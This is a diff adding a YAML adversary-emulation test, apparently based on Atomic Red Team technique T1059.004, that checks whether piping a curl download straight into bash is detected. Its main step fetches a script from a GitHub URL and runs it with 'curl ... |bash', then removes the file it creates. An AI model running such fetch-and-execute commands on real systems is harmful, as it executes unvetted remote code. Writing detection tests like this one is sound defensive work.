@@ -1,0 +1,33 @@
+api_version: "2.0"
+name: Detecting pipe-to-shell
+description: |
+    An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.
+args:
+    - name: remote_url
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
+uuid: fca246a8-a585-4f28-a2df-6495973976a1
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1059: Command and Scripting Interpreter'
+    subtechniques:
+        - 'T1059.004: Unix Shell'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: |
+        Check if curl is installed on the machine.
+      inline: |
+        if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; {which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
+        }; fi
+      executor: bash
+    - name: detecting-pipe-to-shell
+      inline: "cd /tmp\ncurl -s {{.Args.remote_url}} |bash\nls -la /tmp/art.txt      \n"
+      executor: sh
+      cleanup:
+        inline: |
+            rm /tmp/art.txt
+        executor: sh
